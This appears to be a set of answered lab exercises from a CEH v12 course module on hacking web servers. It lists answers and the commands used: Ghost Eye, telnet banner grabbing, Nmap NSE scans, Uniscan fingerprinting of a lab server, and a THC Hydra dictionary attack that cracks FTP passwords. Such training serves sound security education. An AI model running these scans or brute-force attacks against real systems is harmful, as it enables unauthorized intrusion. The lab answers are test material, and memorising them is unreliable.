# Tasks

## Footprint the Web Server

### Information Gathering using Ghost Eye

Use the Ghost Eye information-gathering tool to gather information about the website certifiedhacker.com. Identify the name server (ns1) of certifiedhacker.com.

NS1.BLUEHOST

```
python3 ghost_eye.py

3

certifiedhacker.com
```



Use the Ghost Eye information-gathering tool to perform a clickjacking test on the website certifiedhacker.com. Enter YES if certifiedhacker.com is vulnerable to clickjacking attacks or NO otherwise.

YES

```
python3 ghost_eye.py

6

certifiedhacker.com
```



### Footprint a Web Server using the httprecon tool

Install the httprecon tool on the Windows 11 machine (available at E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon) and footprint the domain www.certifiedhacker.com. Identify the default target port used by httprecon.

80



### Footprint a Web Server using ID Serve

Footprint the domain www.certifiedhacker.com using the ID Serve tool and identify the webserver application used to host the webpages. Note: the ID Serve tool is available at E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\ID Serve.

nginx



### Footprint a Web Server using Netcat and Telnet

Perform banner grabbing using Telnet on the website www.moviescope.com. Identify the web-server application used to host the website.

Microsoft-IIS/10.0

```
telnet www.moviescope.com 80

GET / HTTP/1.0
```



### Enumerate Web Server Information using Nmap Scripting Engine (NSE)

Use Nmap Scripting Engine (NSE) to extract information about the website www.goodshopping.com. Enter the port number of the ms-wbt-server service, which is open on the web server.

3389

```
nmap -sV --script http-enum <Target website>
```

```
nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- <Target Website>
```



Use Nmap Scripting Engine (NSE) to check whether a web-application firewall is configured for the website www.goodshopping.com. Enter YES if a web-application firewall is configured for www.goodshopping.com or NO otherwise.

YES

```
nmap -p 80 --script http-waf-detect www.goodshopping.com
```



### Uniscan Web Server Fingerprinting in Parrot Security

Perform web-server fingerprinting on a WAMP server (the Windows Server 2022 machine) using the Uniscan tool. Identify the scripting language used for the development of the website hosted on the WAMP server.

PHP

```
uniscan -u http://10.10.1.22:8080/CEH -q
```

```
uniscan -u http://10.10.1.22:8080/CEH -we
```



Perform dynamic tests on a WAMP server (the Windows Server 2022 machine) using the Uniscan tool. Enter the server administratorâ€™s email address found in the result.

admin@wampserver.invalid

```
uniscan -u http://10.10.1.22:8080/CEH -d
```



## Perform Web Server Attack

### Crack FTP Credentials

Perform a dictionary attack using the THC Hydra tool to remotely access the FTP server hosted on the Windows 11 machine. Note: The wordlist file is located at CEHv12 Module 13 Hacking Web Servers/Wordlists. Enter the password of the user Martin.

apple



Perform a dictionary attack using the THC Hydra tool to remotely access the FTP server hosted on the Windows 11 machine. Enter the name of the user with the password “qwerty."

Jason



```
nmap -p 21 <Target IP address>
```

```
hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://<Target IP address>
```

